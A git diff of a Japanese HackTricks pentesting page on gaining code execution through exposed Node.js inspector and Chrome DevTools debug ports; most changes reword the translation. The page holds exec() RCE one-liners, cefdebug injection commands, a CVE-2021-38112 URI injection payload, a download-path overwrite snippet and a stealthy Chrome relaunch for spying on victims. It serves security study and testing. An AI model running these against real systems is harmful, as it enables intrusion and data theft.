@@ -7,10 +7,10 @@
 HackTricksをサポートする他の方法：
 
 - **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
+- [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れる
 - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)を**フォロー**する。
-- **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。
+- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)で**フォロー**する。
+- **ハッキングトリックを共有するには、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
 
@@ -35,12 +35,12 @@ node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and po
 node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
 # Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
 ```
-インスペクトされたプロセスを開始すると、次のようなものが表示されます：
+以下のようなものが表示されると、検査されたプロセスが開始されます:
 ```
 Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 For help, see: https://nodejs.org/en/docs/inspector
 ```
-**CEF**（**Chromium Embedded Framework**）ベースのプロセスは、デバッガーを開くために`--remote-debugging-port=9222`というパラメータを使用する必要があります（SSRF保護は非常に似ています）。ただし、これらは**NodeJS**の**デバッグ**セッションを許可する代わりに、[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)を使用してブラウザと通信します。これはブラウザを制御するためのインターフェースですが、直接的なRCEはありません。
+プロセスは、**CEF** (**Chromium Embedded Framework**) ベースのものは、**デバッガ**を開くためにパラメータ `--remote-debugging-port=9222` を使用する必要があります（SSRF保護は非常に似ています）。ただし、これらは **NodeJS** **debug** セッションを許可する代わりに、ブラウザと通信するために [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) を使用します。これはブラウザを制御するためのインターフェースですが、直接的な RCE はありません。
 
 デバッグされたブラウザを起動すると、次のようなものが表示されます：
 ```
@@ -48,7 +48,7 @@ DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4
 ```
 ### ブラウザ、WebSockets、および同一オリジンポリシー <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>
 
-WebサイトはWebブラウザで開かれると、ブラウザのセキュリティモデルに従ってWebSocketおよびHTTPリクエストを行うことができます。**固有のデバッガーセッションIDを取得するためには、最初にHTTP接続が必要**です。**同一オリジンポリシー**は、Webサイトが**このHTTP接続**を行うことを防ぎます。[**DNS再バインディング攻撃**](https://en.wikipedia.org/wiki/DNS\_rebinding)****に対する追加のセキュリティ対策として、Node.jsは接続のための**'Host'ヘッダー**が**IPアドレス**または**`localhost`**または**`localhost6`**を正確に指定していることを検証します。
+WebサイトがWebブラウザで開かれると、ブラウザセキュリティモデルの下でWebSocketおよびHTTPリクエストを行うことができます。**固有のデバッガーセッションIDを取得するためには、最初にHTTP接続が必要**です。**同一オリジンポリシー**は、Webサイトが**このHTTP接続**を行うことを防ぎます。[**DNS再バインディング攻撃**](https://en.wikipedia.org/wiki/DNS\_rebinding)****に対する追加のセキュリティ対策として、Node.jsは接続のための**'Host'ヘッダー**が**IPアドレス**または**`localhost`**または**`localhost6`**を正確に指定していることを検証します。
 
 {% hint style="info" %}
 この**セキュリティ対策により、インスペクターを悪用してコードを実行する**ことが防がれます（これはSSRF脆弱性を悪用して行うことができる）。
@@ -56,20 +56,20 @@ WebサイトはWebブラウザで開かれると、ブラウザのセキュリ�
 
 ### 実行中プロセスでのインスペクターの開始
 
-実行中のnodejsプロセスに**シグナルSIGUSR1**を送信して、**デフォルトポートでインスペクターを開始**させることができます。ただし、十分な権限が必要なので、これによりプロセス内の情報に**特権アクセス**が得られるかもしれませんが、直接的な特権昇格は行われません。
+実行中のnodejsプロセスに**シグナルSIGUSR1**を送信して、**デフォルトポートでインスペクターを開始**させることができます。ただし、十分な権限が必要なので、これによりプロセス内の情報に**特権アクセス**が付与される可能性がありますが、直接的な特権昇格は行われません。
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 ```
 {% hint style="info" %}
-これはコンテナ内で便利です。`--inspect`を使用してプロセスを**シャットダウンして新しいプロセスを起動**することは**選択肢ではない**ため、**コンテナ**はプロセスとともに**終了**されます。
+コンテナ内でこれは便利です。`--inspect`でプロセスを**シャットダウンして新しいプロセスを起動**することは**選択肢ではない**ため、**コンテナ**はプロセスとともに**終了**されます。
 {% endhint %}
 
 ### インスペクター/デバッガーに接続
 
-**Chromiumベースのブラウザ**に接続するには、Chromeの場合は`chrome://inspect`またはEdgeの場合は`edge://inspect`のURLにアクセスできます。Configureボタンをクリックして、**ターゲットホストとポート**が正しくリストされていることを確認する必要があります。画像はリモートコード実行（RCE）の例を示しています：
+**Chromiumベースのブラウザ**に接続するには、Chromeの場合は`chrome://inspect`またはEdgeの場合は`edge://inspect`のURLにアクセスできます。構成ボタンをクリックして、**ターゲットホストとポート**が正しくリストされていることを確認する必要があります。画像はリモートコード実行（RCE）の例を示しています：
 
-![](<../../.gitbook/assets/image (620) (1).png>)
+![](<../../.gitbook/assets/image (674).png>)
 
 **コマンドライン**を使用して、デバッガー/インスペクターに接続できます：
 ```bash
@@ -78,7 +78,7 @@ node inspect 127.0.0.1:9229
 # RCE example from debug console
 debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
 ```
-ツール[**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug)は、ローカルで実行中の**インスペクターを見つけ**、それに**コードを注入**することができます。
+ツール[**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug)を使用すると、ローカルで実行中の**インスペクタ**を**見つけて**その中にコードを**注入**することができます。
 ```bash
 #List possible vulnerable sockets
 ./cefdebug.exe
@@ -88,16 +88,16 @@ debug> exec("process.mainModule.require('child_process').exec('/Applications/iTe
 ./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
 ```
 {% hint style="info" %}
-**NodeJS RCE exploits**は、ブラウザを[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)経由で接続している場合には機能しません（興味深いことを見つけるためにAPIをチェックする必要があります）。
+**NodeJS RCE exploits**は、ブラウザを[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)経由で接続している場合には機能しないことに注意してください（興味深いことを見つけるためにAPIをチェックする必要があります）。
 {% endhint %}
 
 ## NodeJSデバッガー/インスペクターでのRCE
 
 {% hint style="info" %}
-もし[**ElectronのXSSからRCEを取得する方法**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)を探してここに来たのであれば、このページをチェックしてください。
+もし[**ElectronのXSSからRCEを取得する方法**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)を探してここに来た場合は、このページをご確認ください。
 {% endhint %}
 
-Node **inspector**に**接続**できる場合に**RCE**を取得する一般的な方法は、次のようなものを使用することです（Chrome DevToolsプロトコルへの接続では動作しないようです）:
+Node **inspector**に**接続**できる場合に**RCE**を取得する一般的な方法のいくつかは、次のようなものを使用することです（Chrome DevToolsプロトコルへの接続では機能しないようです）:
 ```javascript
 process.mainModule.require('child_process').exec('calc')
 window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
@@ -106,22 +106,22 @@ Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
 ```
 ## Chrome DevTools Protocol Payloads
 
-APIは[こちら](https://chromedevtools.github.io/devtools-protocol/)で確認できます。\
+APIはこちらで確認できます: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
 このセクションでは、このプロトコルを悪用するために人々が使用してきた興味深い事柄をリストアップします。
 
 ### ディープリンクを介したパラメーターインジェクション
 
 [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)では、Rhino Securityが、CEFに基づくアプリケーションがシステムにカスタムURI（workspaces://）を登録し、そのURIを受け取り、そのURIから部分的に構築された構成でCEFベースのアプリケーションを起動していたことを発見しました。
 
-URIパラメーターがURLデコードされ、CEFベースのアプリケーションを起動するために使用されていたことが発見され、ユーザーがコマンドラインに`--gpu-launcher`フラグをインジェクトして任意の操作を実行できるようになりました。
+URIパラメーターがURLデコードされ、CEFベースのアプリケーションを起動するために使用されていることが発見され、ユーザーがコマンドラインに`--gpu-launcher`フラグをインジェクトして任意の操作を実行できるようになっていました。
 
-したがって、次のようなペイロード：
+したがって、次のようなペイロード:
 ```
 workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
 ```
 ### ファイルの上書き
 
-**ダウンロードされたファイルが保存されるフォルダ**を変更し、**悪意のあるコード**で**アプリケーションのソースコード**を頻繁に使用されるファイルで上書きします。
+**ダウンロードされたファイルが保存されるフォルダ**を変更し、**悪意のあるコード**で**アプリケーションのソースコード**を頻繁に使用されるように**上書き**するファイルをダウンロードします。
 ```javascript
 ws = new WebSocket(url); //URL of the chrome devtools service
 ws.send(JSON.stringify({
@@ -139,9 +139,9 @@ downloadPath: '/code/'
 
 ### ポストエクスプロイテーション
 
-実際の環境において、**ユーザーの PC が Chrome/Chromium ベースのブラウザを使用している場合に**、Chrome プロセスを起動し、**デバッグを有効にしてデバッグポートをポートフォワード**することができます。これにより、Chrome を使用している被害者の行動を**すべて検査し、機密情報を盗むことができます**。
+実際の環境において、ユーザーの PC を侵害した後、Chrome/Chromium ベースのブラウザを使用している場合、Chrome プロセスをデバッグを有効にして起動し、デバッグポートをポートフォワードしてアクセスできるようにすることができます。これにより、被害者が Chrome で行うすべての操作を検査し、機密情報を盗むことができます。
 
-ステルス的な方法は、**すべての Chrome プロセスを終了**し、次のようなものを呼び出すことです:
+ステルスな方法は、すべての Chrome プロセスを終了させ、次のようなものを呼び出すことです:
 ```bash
 Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
 ```
@@ -167,7 +167,7 @@ HackTricksをサポートする他の方法:
 * **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 * [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[Telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)を**フォロー**する。
-* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)をフォローする。
+* **HackTricks**および**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。
 
 </details>
